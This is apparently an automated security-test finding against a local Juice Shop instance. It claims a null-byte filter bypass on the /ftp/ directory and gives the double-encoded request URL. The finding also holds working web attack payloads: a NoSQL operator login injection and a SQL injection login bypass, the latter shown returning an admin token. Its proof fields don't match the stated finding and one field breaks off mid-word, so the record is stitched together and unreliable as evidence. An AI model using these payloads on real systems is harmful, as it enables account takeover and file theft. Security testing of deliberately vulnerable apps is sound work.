title: Null Byte Injection - File Extension Filter Bypass
description: The /ftp/ directory restricts access to .md and .pdf files only, but appending %2500.md (double URL-encoded null byte) bypasses the filter, allowing retrieval of any file under /ftp/.
poc: Probe request against GET http://127.0.0.1:3010/ftp/suspicious_errors.yml%2500.md; observed proving result from prior stage handoff: POST with payload {"email":"admin@juice-sh.op","password":{"$gt":""}} returned 500: "TypeError [ERR_INVALID_ARG_TYPE]: The \"data\" argument must be of type string or an instance of Buffer... Received an instance of Obje
proof: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
